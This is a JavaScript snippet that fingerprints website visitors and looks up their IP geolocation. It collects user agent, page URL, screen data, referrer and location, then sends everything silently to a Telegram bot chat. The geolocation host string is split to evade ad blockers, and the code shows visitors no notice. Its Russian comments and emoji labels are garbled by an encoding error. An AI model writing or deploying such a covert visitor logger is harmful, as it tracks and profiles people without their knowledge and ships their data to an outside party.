//ublock lock host json.geoip'+'lookup.io
var userData = {
    "IP": [],
    "fingerprintHash": '',
    "userAgent": navigator.userAgent,
    "currentPath": window.location.pathname,  // –¢–µ–∫—É—â–∏–π –ø—É—Ç—å —Å—Ç—Ä–∞–Ω–∏—Ü—ã
    "currentUrl": window.location.href,        // –ü–æ–ª–Ω—ã–π URL —Å—Ç—Ä–∞–Ω–∏—Ü—ã

    "screenWidth": window.screen.width,
    "screenHeight": window.screen.height,
    "colorDepth": window.screen.colorDepth,
    "language": navigator.language,
    "timezoneOffset": new Date().getTimezoneOffset(),
    "referrer": document.referrer,
    "cookieEnabled": navigator.cookieEnabled,
    //"platform": navigator.platform
}


try {
    new Fingerprint2().get(function (fingerprint, components) {
        console.log(fingerprint); //a hash, representing your device fingerprint
        console.log(components); // an array of FP components

        userData.fingerprintHash = fingerprint; // Assign the fingerprint hash to userData

        // Additional processing or sending data can go here
    });
} catch (error) {
    console.error('–û—à–∏–±–∫–∞ –ø–æ–ª—É—á–µ–Ω–∏—è –æ—Ç–ø–µ—á–∞—Ç–∫–∞ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞:', error);

    // You can also store the error in userData or perform other error handling actions
    userData.fingerprintHash = '–û—à–∏–±–∫–∞ –ø–æ–ª—É—á–µ–Ω–∏—è –æ—Ç–ø–µ—á–∞—Ç–∫–∞ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞';
}


const headers = {
    "IP": "üìç IP Address",
    "ip": "üñ•Ô∏è IP Address",
    "isp": "üåê ISP",
    "org": "üè¢ Organization",
    "hostname": "üè† Hostname",
    "latitude": "üìç Latitude",
    "longitude": "üìç Longitude",
    "postal_code": "üìÆ Postal Code",
    "city": "üèôÔ∏è City",
    "country_code": "## COUNTRY CODE ##",
    "country_name": "üåé Country",
    "continent_code": "üåç Continent Code",
    "continent_name": "üåç Continent",
    "region": "üó∫Ô∏è Region",
    "district": "üìç District",
    "timezone_name": "üï∞Ô∏è Timezone",
    "connection_type": "üîó Connection Type",
    "asn_number": "üî¢ ASN Number",
    "asn_org": "üè¢ ASN Organization",
    "asn": "üî¢ ASN",
    "currency_code": "üíµ Currency Code",
    "currency_name": "üíµ Currency",
    "success": "‚úÖ Success",
    "premium": "‚≠ê Premium",
    "userAgent": "üñ•Ô∏è User Agent"
};

var sendIpsTelegram = function (token, chatID) {
    endpoint = 'https://api.telegram.org/' + token + '/sendMessage';
    $.getJSON('https://json.geoiplookup.io/?callback=?')
        .done(function (dataIP) { // –£—Å–ø–µ—à–Ω—ã–π –∑–∞–ø—Ä–æ—Å
            userData.IP = dataIP;
        })
        .fail(function (jqXHR, textStatus, errorThrown) { // –ù–µ—É–¥–∞—á–Ω—ã–π –∑–∞–ø—Ä–æ—Å
            console.error('–û—à–∏–±–∫–∞ –∑–∞–ø—Ä–æ—Å–∞ –∫ geoiplookup.io: ' + textStatus, errorThrown);
            userData.IP = {error: '–û—à–∏–±–∫–∞ –∑–∞–ø—Ä–æ—Å–∞ –∫ geoiplookup.io: [' + textStatus + ' ' + errorThrown + ']'};

            //try @@ https://get.geojs.io/v1/ip/country.json @@
        })
        .always(function () {
            // –≠—Ç–æ—Ç –∫–æ–¥ –≤—ã–ø–æ–ª–Ω–∏—Ç—Å—è –≤ –ª—é–±–æ–º —Å–ª—É—á–∞–µ, –Ω–µ–∑–∞–≤–∏—Å–∏–º–æ –æ—Ç —É—Å–ø–µ—Ö–∞ –∏–ª–∏ –Ω–µ—É–¥–∞—á–∏ –∑–∞–ø—Ä–æ—Å–∞
            setTimeout(function () {
                var xhr = new XMLHttpRequest();
                xhr.open("POST", endpoint, true);
                xhr.setRequestHeader('Content-Type', 'application/json; charset=UTF-8');
                var data = {
                    'chat_id': chatID, 'text': '<pre>' + JSON.stringify(userData, function replacer(key, value) {
// –í–æ–∑–≤—Ä–∞—â–∞–µ–º –Ω–æ–≤—ã–π –æ–±—ä–µ–∫—Ç —Å –∑–∞–º–µ–Ω–µ–Ω–Ω—ã–º–∏ –∫–ª—é—á–∞–º–∏
                        if (typeof value === 'object' && value !== null) {
                            const newObj = {};
                            for (const prop in value) {
                                if (value.hasOwnProperty(prop)) {
                                    const newKey = headers[prop] || prop; // –ò—Å–ø–æ–ª—å–∑—É–µ–º –∑–∞–≥–æ–ª–æ–≤–æ–∫, –µ—Å–ª–∏ –æ–Ω –µ—Å—Ç—å, –∏–Ω–∞—á–µ –æ—Å—Ç–∞–≤–ª—è–µ–º –∫–ª—é—á –±–µ–∑ –∏–∑–º–µ–Ω–µ–Ω–∏–π
                                    newObj[newKey] = value[prop];
                                }
                            }
                            return newObj;
                        }

                        return value;
                    }, 2) + '</pre>', 'parse_mode': 'html'
                }; // –î–∞–Ω–Ω—ã–µ –¥–ª—è –æ—Ç–ø—Ä–∞–≤–∫–∏
                xhr.send(JSON.stringify(data));
                xhr.onloadend = function () {
                    // –î–µ–π—Å—Ç–≤–∏—è –ø–æ –∑–∞–≤–µ—Ä—à–µ–Ω–∏—é –æ—Ç–ø—Ä–∞–≤–∫–∏ –¥–∞–Ω–Ω—ã—Ö
                };
            }, 100);
        });
}
